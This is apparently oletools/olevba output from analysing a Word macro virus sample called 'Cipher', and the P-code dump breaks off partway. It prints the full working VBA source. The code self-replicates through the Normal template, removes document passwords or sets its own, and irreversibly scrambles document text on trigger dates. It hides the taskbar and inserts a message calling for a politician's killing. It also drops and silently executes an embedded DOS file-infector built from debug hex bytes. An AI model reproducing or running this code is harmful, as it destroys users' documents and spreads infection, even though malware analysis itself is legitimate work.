olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cipher
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cipher - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cipher.bas 
in file: ./Virus.MSWord.Cipher - OLE stream: 'Macros/VBA/Cipher'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Const SWP_HIDEWINDOW = &H80
Sub AutoNew()
Attribute AutoNew.VB_Description = "Macro creata il 30/10/97 da DrJeKiLL"
Attribute AutoNew.VB_ProcData.VB_Invoke_Func = "Project.Cipher.AutoNew"
On Local Error Resume Next
For Each Modul In NormalTemplate.VBProject.VBComponents
    If Modul.Name = "Cipher" Then
        Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="Cipher", Object:=wdOrganizerObjectProjectItems
    End If
Next Modul
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Cipher", Object:=wdOrganizerObjectProjectItems
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro creata il 30/10/97 da DrJeKiLL"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.Cipher.AutoOpen"
Dim MacroInDoc As Boolean
On Local Error GoTo esco
MacroInDoc = False
For Each Modul In ActiveDocument.VBProject.VBComponents
    If Modul.Name = "Cipher" Then
        MacroInDoc = True
    End If
Next Modul
If MacroInDoc = False Then
AutoNew
Else
For Each Modul In NormalTemplate.VBProject.VBComponents
    If Modul.Name = "Cipher" Then
        Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="Cipher", Object:=wdOrganizerObjectProjectItems
    End If
Next Modul
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Cipher", Object:=wdOrganizerObjectProjectItems
End If
If ActiveDocument.HasPassword = True Then ActiveDocument.Password = ""
If ActiveDocument.WriteReserved = True Then ActiveDocument.WritePassword = ""
If Timer > 79200 Then
    ActiveDocument.Password = "MisterCipher"
End If
If WeekDay(DateValue(Format(Now, "dd/mm/yyyy"))) = 6 Then
    If Format(Now, "dd") = "17" Then spreadIB
End If
If Format(Now, "dd") = "31" Then spreadIB
If Format(Now, "dd/mm") = "25/04" Then spreadIB
ActiveDocument.Save
esco:
End Sub
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro creata il 30/10/97 da DrJeKiLL"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.Cipher.AutoClose"
AutoOpen
On Local Error GoTo ferma
If Timer > 79200 Then
    MsgBox "I say to you that it's " + Format(Now, "hh:mm") + Chr(13) + "It's too late. You must finish to work before next time!!!" + Chr(13) + Chr(9) + "Bye,Bye", vbInformation, "Time Signal"
    hideb
End If
If Format(Now, "dd/mm") = "25/04" Then
    cphrdoc
    GoTo ferma
End If
If WeekDay(DateValue(Format(Now, "dd/mm/yyyy"))) = 6 Then
    If Timer > 57600 And Timer < 72000 Then
        cphrdoc
    End If
End If
ferma:
End Sub
Sub cphrdoc()
Attribute cphrdoc.VB_Description = "Macro creata il 30/10/97 da DrJeKiLL"
Attribute cphrdoc.VB_ProcData.VB_Invoke_Func = "Project.Cipher.cphrdoc"
Dim parola As String
Dim temp As String * 1
Dim a As Integer
Dim x As Long
Dim i As Integer
Dim parmod As String
Dim myname As String
Dim mypos As Long
    On Local Error GoTo esch
    Randomize Timer
    For x = 1 To ActiveDocument.Words.Count - 1
        parola = ActiveDocument.Words(x).Text
        parmod = ""
        For i = 1 To Len(parola)
            a = Int(Rnd * 10 + 2)
            temp = Mid(parola, i, 1)
            temp = Chr$((Asc(temp) * a) Mod 256)
            parmod = parmod + temp
        Next i
        ActiveDocument.Words(x).Text = parmod
    Next x
    myname = "Mister Cipher reigning"
    ActiveDocument.Words(1).Font.Size = 36
    ActiveDocument.Words(1).Font.Bold = True
    ActiveDocument.Words(1).Font.Italic = True
    ActiveDocument.Words(1).InsertBefore "I want to say to you: L'Italia è una ed indivisibile e c'è la morte per chi la divide!!!!!....." + Chr(13) + "Are you angry because you lost your document?¿; Kill Bossi, the fault is his"
    mypos = (ActiveDocument.Words.Count - 1) / 2
    If (ActiveDocument.Words.Count - 1) > 40 And mypos < 38 Then mypos = 40
    ActiveDocument.Words(mypos).Font.Size = 18
    ActiveDocument.Words(mypos).Font.Bold = True
    ActiveDocument.Words(mypos).Font.Italic = True
    ActiveDocument.Words(mypos).InsertAfter myname
    ActiveDocument.Save
esch:
End Sub
Sub hideb()
Attribute hideb.VB_Description = "Macro creata il 30/10/97 da DrJeKiLL"
Attribute hideb.VB_ProcData.VB_Invoke_Func = "Project.Cipher.hidebar"
On Local Error Resume Next
Dim hwnd1 As Long
hwnd1 = FindWindow("Shell_traywnd", "")
Call SetWindowPos(hwnd1, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
End Sub
Function WindowsDirectory() As String
On Local Error Resume Next
Dim Winpath As String
Dim temp
    Winpath = String(145, Chr(0))
    temp = GetWindowsDirectory(Winpath, 145)
    WindowsDirectory = Left(Winpath, InStr(Winpath, Chr(0)) - 1)
End Function
Sub spreadIB()
Attribute spreadIB.VB_Description = "Macro creata il 30/10/97 da DrJeKiLL"
Attribute spreadIB.VB_ProcData.VB_Invoke_Func = "Project.Cipher.spreadIB"
On Local Error GoTo nospread
    Dim WinDir As String
        WinDir = WindowsDirectory
        If Right(WinDir, 1) <> "\" Then WinDir = WinDir + "\"
        Open WinDir + "MrCipher.scp" For Output As #1
            Print #1, "N " + WinDir + "ITAL-BOY.COM"
            Print #1, "E 0100 E8 00 00 5E 83 EE 03 B8 01 F2 CD 21 3D F2 01 74"
            Print #1, "E 0110 4E 53 06 57 56 8C C3 4B 8E DB 33 FF 8B 45 03 83"
            Print #1, "E 0120 E8 38 89 45 03 83 6D 12 38 43 03 C3 8E C0 0E 1F"
            Print #1, "E 0130 B9 42 02 F3 A4 5E 5F 07 5B 83 E8 10 50 B8 42 01"
            Print #1, "E 0140 50 CB 1E 06 0E 1F B8 21 35 CD 21 2E 89 1E CE 02"
            Print #1, "E 0150 2E 8C 06 D0 02 B8 21 25 BA 71 01 CD 21 07 1F 81"
            Print #1, "E 0160 C6 D2 01 BF 00 01 B9 06 00 F3 A4 06 B8 00 01 50"
            Print #1, "E 0170 CB 3D 01 F2 75 03 86 E0 CF 3D 00 4B 74 03 E9 C2"
            Print #1, "E 0180 00 9C 50 53 51 52 1E 06 57 56 55 E8 BB 00 B8 02"
            Print #1, "E 0190 3D CD 21 0E 1F 8B E8 B4 3F 8B DD B9 02 00 BA DE"
            Print #1, "E 01A0 02 CD 21 81 3E DE 02 4D 5A 75 03 E9 85 00 B8 00"
            Print #1, "E 01B0 42 8B DD 33 C9 33 D2 CD 21 B4 3F 8B DD BA 31 03"
            Print #1, "E 01C0 B9 01 00 CD 21 B4 0E 3A 26 31 03 74 66 B8 00 57"
            Print #1, "E 01D0 8B DD CD 21 51 52 B8 00 42 8B DD 33 C9 33 D2 CD"
            Print #1, "E 01E0 21 B4 3F B9 06 00 8B DD BA D2 02 CD 21 B8 02 42"
            Print #1, "E 01F0 33 C9 33 D2 8B DD CD 21 05 00 01 88 26 DB 02 A2"
            Print #1, "E 0200 DA 02 B4 40 8B DD B9 42 02 BA 00 01 CD 21 B8 00"
            Print #1, "E 0210 42 8B DD 33 C9 33 D2 CD 21 B4 40 8B DD BA D8 02"
            Print #1, "E 0220 B9 06 00 CD 21 B8 01 57 5A 59 8B DD CD 21 2E FF"
            Print #1, "E 0230 06 2F 03 B4 3E 8B DD CD 21 5D 5E 5F 07 1F 5A 59"
            Print #1, "E 0240 5B 58 9D 2E FF 2E CE 02 CF 50 52 51 B4 2A CD 21"
            Print #1, "E 0250 80 FE 04 74 02 EB 05 80 FA 03 73 04 59 5A 58 C3"
            Print #1, "E 0260 59 5A 58 E8 00 00 33 D2 B9 19 00 51 B9 19 00 B3"
            Print #1, "E 0270 22 E8 40 00 FE C2 E2 F7 B9 19 00 B3 77 E8 34 00"
            Print #1, "E 0280 FE C2 E2 F7 B9 1B 00 B3 44 E8 28 00 FE C2 E2 F7"
            Print #1, "E 0290 59 FE C6 32 D2 E2 D4 B4 13 B6 0A B2 0F BD E0 02"
            Print #1, "E 02A0 B9 31 00 B3 0E 32 FF CD 10 B0 00 B9 1E 00 33 D2"
            Print #1, "E 02B0 CD 26 EB FE 50 53 51 52 B4 13 B7 00 B9 01 00 0E"
            Print #1, "E 02C0 0E 07 1F BD 33 03 CD 10 5A 59 5B 58 C3 00 00 00"
            Print #1, "E 02D0 00 00 CD 20 00 00 00 00 0E B8 00 00 50 CB 00 00"
            Print #1, "E 02E0 FE 20 49 54 41 4C 59 20 20 49 53 20 20 54 48 45"
            Print #1, "E 02F0 20 20 42 45 53 54 20 20 43 4F 55 4E 54 52 59 20"
            Print #1, "E 0300 20 49 4E 20 20 54 48 45 20 20 57 4F 52 4C 44 20"
            Print #1, "E 0310 FE 46 75 63 6B 73 20 74 6F 20 49 74 61 6C 69 61"
            Print #1, "E 0320 6E 20 56 69 72 75 73 20 4B 69 6C 6C 65 72 73 00"
            Print #1, "E 0330 00 00 0E DB"
            Print #1, "RCX"
            Print #1, "234"
            Print #1, "W"
            Print #1, "Q"
        Close #1
        Open WinDir + "MrCphr.bat" For Output As #2
            Print #2, "@echo off"
            Print #2, "debug < " + WinDir + "MrCipher.scp > nul"
            Print #2, "attrib +h +r " + WinDir + "ITAL-BOY.COM"
            Print #2, WinDir + "ITAL-BOY.COM"
            Print #2, "del " + WinDir + "MrCipher.scp"
            Print #2, "del" + WinDir + "MrCphr.bat"
        Close #2
        Shell WinDir + "MrCphr.bat", vbHide
nospread:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cipher
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Cipher - 14359 bytes
' Line #0:
' 	FuncDefn (Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long)
' Line #1:
' 	FuncDefn (Declare Function FindWindow Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long)
' Line #2:
' 	FuncDefn (Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #3:
' 	Dim (Const) 
' 	LitHI2 0x0080 
' 	VarDefn SWP_HIDEWINDOW
' Line #4:
' 	FuncDefn (Sub AutoNew())
' Line #5:
' 	OnError <crash> 
' Line #6:
' 	StartForVariable 
' 	Ld Modul 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #7:
' 	Ld Modul 
' 	MemLd New 
' 	LitStr 0x0006 "Cipher"
' 	Eq 
' 	IfBlock 
' Line #8:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0006 "Cipher"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld Modul 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Cipher"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Sub AutoOpen())
' Line #14:
' 	Dim 
' 	VarDefn MacroInDoc (As Boolean)
' Line #15:
' 	OnError esco 
' Line #16:
' 	LitVarSpecial (False)
' 	St MacroInDoc 
' Line #17:
' 	StartForVariable 
' 	Ld Modul 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #18:
' 	Ld Modul 
' 	MemLd New 
' 	LitStr 0x0006 "Cipher"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitVarSpecial (True)
' 	St MacroInDoc 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld Modul 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	Ld MacroInDoc 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #23:
' 	ArgsCall AutoNew 0x0000 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	StartForVariable 
' 	Ld Modul 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #26:
' 	Ld Modul 
' 	MemLd New 
' 	LitStr 0x0006 "Cipher"
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0006 "Cipher"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld Modul 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Cipher"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd WriteReserved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt WritePassword 
' 	EndIf 
' Line #34:
' 	Ld Timer 
' 	LitDI4 0x3560 0x0001 
' 	Gt 
' 	IfBlock 
' Line #35:
' 	LitStr 0x000C "MisterCipher"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld Now 
' 	LitStr 0x000A "dd/mm/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd DateValue 0x0001 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	Ld Now 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0002 "17"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall spreadIB 0x0000 
' 	EndIf 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld Now 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0002 "31"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall spreadIB 0x0000 
' 	EndIf 
' Line #41:
' 	Ld Now 
' 	LitStr 0x0005 "dd/mm"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0005 "25/04"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall spreadIB 0x0000 
' 	EndIf 
' Line #42:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	Label esco 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub AutoClose())
' Line #46:
' 	ArgsCall AutoOpen 0x0000 
' Line #47:
' 	OnError ferma 
' Line #48:
' 	Ld Timer 
' 	LitDI4 0x3560 0x0001 
' 	Gt 
' 	IfBlock 
' Line #49:
' 	LitStr 0x0017 "I say to you that it's "
' 	Ld Now 
' 	LitStr 0x0005 "hh:mm"
' 	ArgsLd Format$ 0x0002 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x003A "It's too late. You must finish to work before next time!!!"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Bye,Bye"
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x000B "Time Signal"
' 	ArgsCall MsgBox 0x0003 
' Line #50:
' 	ArgsCall hideb 0x0000 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld Now 
' 	LitStr 0x0005 "dd/mm"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0005 "25/04"
' 	Eq 
' 	IfBlock 
' Line #53:
' 	ArgsCall cphrdoc 0x0000 
' Line #54:
' 	GoTo ferma 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Ld Now 
' 	LitStr 0x000A "dd/mm/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd DateValue 0x0001 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #57:
' 	Ld Timer 
' 	LitDI4 0xE100 0x0000 
' 	Gt 
' 	Ld Timer 
' 	LitDI4 0x1940 0x0001 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #58:
' 	ArgsCall cphrdoc 0x0000 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Label ferma 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub cphrdoc())
' Line #64:
' 	Dim 
' 	VarDefn parola (As String)
' Line #65:
' 	Dim 
' 	LitDI2 0x0001 
' 	VarDefn temp
' Line #66:
' 	Dim 
' 	VarDefn a (As Integer)
' Line #67:
' 	Dim 
' 	VarDefn x (As Long)
' Line #68:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #69:
' 	Dim 
' 	VarDefn parmod (As String)
' Line #70:
' 	Dim 
' 	VarDefn myname (As String)
' Line #71:
' 	Dim 
' 	VarDefn mypos (As Long)
' Line #72:
' 	OnError esch 
' Line #73:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #74:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #75:
' 	Ld x 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Then 
' 	St parola 
' Line #76:
' 	LitStr 0x0000 ""
' 	St parmod 
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld parola 
' 	FnLen 
' 	For 
' Line #78:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	LitDI2 0x0002 
' 	Add 
' 	FnInt 
' 	St a 
' Line #79:
' 	Ld parola 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St temp 
' Line #80:
' 	Ld temp 
' 	ArgsLd Asc 0x0001 
' 	Ld a 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0100 
' 	Mod 
' 	ArgsLd Chr$ 0x0001 
' 	St temp 
' Line #81:
' 	Ld parmod 
' 	Ld temp 
' 	Add 
' 	St parmod 
' Line #82:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	Ld parmod 
' 	Ld x 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemSt Then 
' Line #84:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #85:
' 	LitStr 0x0016 "Mister Cipher reigning"
' 	St myname 
' Line #86:
' 	LitDI2 0x0024 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Font 
' 	MemSt Size 
' Line #87:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Font 
' 	MemSt Bold 
' Line #88:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Font 
' 	MemSt Italic 
' Line #89:
' 	LitStr 0x005F "I want to say to you: L'Italia è una ed indivisibile e c'è la morte per chi la divide!!!!!....."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x004C "Are you angry because you lost your document?¿; Kill Bossi, the fault is his"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #90:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	Div 
' 	St mypos 
' Line #91:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0028 
' 	Gt 
' 	Ld mypos 
' 	LitDI2 0x0026 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0028 
' 	St mypos 
' 	EndIf 
' Line #92:
' 	LitDI2 0x0012 
' 	Ld mypos 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Font 
' 	MemSt Size 
' Line #93:
' 	LitVarSpecial (True)
' 	Ld mypos 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Font 
' 	MemSt Bold 
' Line #94:
' 	LitVarSpecial (True)
' 	Ld mypos 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Font 
' 	MemSt Italic 
' Line #95:
' 	Ld myname 
' 	Ld mypos 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #96:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #97:
' 	Label esch 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub hideb())
' Line #100:
' 	OnError <crash> 
' Line #101:
' 	Dim 
' 	VarDefn hwnd1 (As Long)
' Line #102:
' 	LitStr 0x000D "Shell_traywnd"
' 	LitStr 0x0000 ""
' 	ArgsLd FindWindow 0x0002 
' 	St hwnd1 
' Line #103:
' 	Ld hwnd1 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld SWP_HIDEWINDOW 
' 	ArgsCall (Call) SetWindowPos 0x0007 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Function WindowsDirectory() As String)
' Line #106:
' 	OnError <crash> 
' Line #107:
' 	Dim 
' 	VarDefn Winpath (As String)
' Line #108:
' 	Dim 
' 	VarDefn temp
' Line #109:
' 	LitDI2 0x0091 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	St Winpath 
' Line #110:
' 	Ld Winpath 
' 	LitDI2 0x0091 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St temp 
' Line #111:
' 	Ld Winpath 
' 	Ld Winpath 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St WindowsDirectory 
' Line #112:
' 	EndFunc 
' Line #113:
' 	FuncDefn (Sub spreadIB())
' Line #114:
' 	OnError nospread 
' Line #115:
' 	Dim 
' 	VarDefn WinDir (As String)
' Line #116:
' 	Ld WindowsDirectory 
' 	St WinDir 
' Line #117:
' 	Ld WinDir 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld WinDir 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St WinDir 
' 	EndIf 
' Line #118:
' 	Ld WinDir 
' 	LitStr 0x000C "MrCipher.scp"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "N "
' 	Ld WinDir 
' 	Add 
' 	LitStr 0x000C "ITAL-BOY.COM"
' 	Add 
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 E8 00 00 5E 83 EE 03 B8 01 F2 CD 21 3D F2 01 74"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 4E 53 06 57 56 8C C3 4B 8E DB 33 FF 8B 45 03 83"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 E8 38 89 45 03 83 6D 12 38 43 03 C3 8E C0 0E 1F"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 B9 42 02 F3 A4 5E 5F 07 5B 83 E8 10 50 B8 42 01"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 50 CB 1E 06 0E 1F B8 21 35 CD 21 2E 89 1E CE 02"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 2E 8C 06 D0 02 B8 21 25 BA 71 01 CD 21 07 1F 81"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 C6 D2 01 BF 00 01 B9 06 00 F3 A4 06 B8 00 01 50"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 CB 3D 01 F2 75 03 86 E0 CF 3D 00 4B 74 03 E9 C2"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 00 9C 50 53 51 52 1E 06 57 56 55 E8 BB 00 B8 02"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 3D CD 21 0E 1F 8B E8 B4 3F 8B DD B9 02 00 BA DE"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 02 CD 21 81 3E DE 02 4D 5A 75 03 E9 85 00 B8 00"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 42 8B DD 33 C9 33 D2 CD 21 B4 3F 8B DD BA 31 03"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 B9 01 00 CD 21 B4 0E 3A 26 31 03 74 66 B8 00 57"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 8B DD CD 21 51 52 B8 00 42 8B DD 33 C9 33 D2 CD"
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01E0 21 B4 3F B9 06 00 8B DD BA D2 02 CD 21 B8 02 42"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01F0 33 C9 33 D2 8B DD CD 21 05 00 01 88 26 DB 02 A2"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0200 DA 02 B4 40 8B DD B9 42 02 BA 00 01 CD 21 B8 00"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
